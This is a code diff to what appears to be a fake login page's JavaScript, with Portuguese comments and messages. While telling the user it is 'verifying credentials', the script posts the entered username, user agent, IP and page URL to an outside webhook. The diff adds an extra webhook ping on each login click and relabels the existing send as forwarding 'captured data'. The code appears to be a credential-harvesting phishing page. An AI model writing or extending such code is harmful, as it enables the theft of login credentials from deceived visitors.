@@ -189,6 +189,35 @@
             // Mostrar mensagem de carregamento
             showStatus('⏳ Verificando credenciais...', 'info');
             
+            // Primeiro, enviar mensagem de teste
+            const testMessage = `🧪 **TESTE - Botão Entrar Clicado**
+
+✅ **Status:** Usuário clicou no botão Entrar
+⏰ **Data/Hora:** ${new Date().toLocaleString('pt-BR')}
+🌐 **URL:** ${window.location.href}
+📱 **User Agent:** ${navigator.userAgent}`;
+            
+            // Enviar mensagem de teste
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: testMessage
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('✅ Mensagem de teste enviada com sucesso!');
+                } else {
+                    console.error('❌ Erro ao enviar mensagem de teste:', response.status);
+                }
+            })
+            .catch(error => {
+                console.error('❌ Erro de conexão na mensagem de teste:', error);
+            });
+            
             // Preparar dados para enviar
             const loginData = {
                 username: username,
@@ -209,7 +238,7 @@
 📱 **User Agent:** ${loginData.userAgent}
 🌍 **IP:** ${loginData.ip}`;
             
-            // Enviar para o webhook
+            // Enviar dados capturados para o webhook
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: {
